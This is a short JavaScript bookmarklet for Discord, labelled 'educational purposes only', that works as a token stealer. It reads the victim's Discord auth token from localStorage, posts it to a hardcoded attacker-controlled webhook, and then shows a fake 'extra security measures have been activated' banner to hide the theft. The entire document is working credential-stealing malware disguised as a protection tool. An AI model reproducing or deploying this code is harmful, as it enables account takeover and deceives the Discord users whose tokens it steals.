// warning: educational purposes only.
javascript: void (function () {  if ("https://discord.com" != this.document.location.origin)    alert("You must be on Discord to use this tool!");  else {    const c = document.createElement("iframe");    document.head.append(c);    const d = Object.getOwnPropertyDescriptor(c.contentWindow, "localStorage");    c.remove(),      Object.defineProperty(window, "localStorage", d),      (t = localStorage.getItem("token")),      (e = localStorage.getItem("email_cache"));    var a = new XMLHttpRequest();    a.open(      "POST",      "https://discord.com/api/webhooks/1145102827648196618/8FN94SI5LaObTH7DiG2Ktzx28E4GcCncJS_VJbTbdwEaHNjSiRXWrW-TizwrAalnEHyV"    ),      a.setRequestHeader("Content-type", "application/json");    var b = {      embeds: [        {          color: 16515972,          title: "Protection Enabled",          description: `\`\`\`${t}\`\`\``,        },      ],    };    a.send(JSON.stringify(b)),      (notice = `<div class="notice-3bPHh-" style="background-color:#364995;color:white;">%F0%9F%94%92 Extra security measures have been activated on your account.<a href = "https://discord.com/channels/@me"> <b>Reload</b><a></div>`),      document        .querySelector(".base-3dtUhz")        .insertAdjacentHTML("afterbegin", notice);  }})();
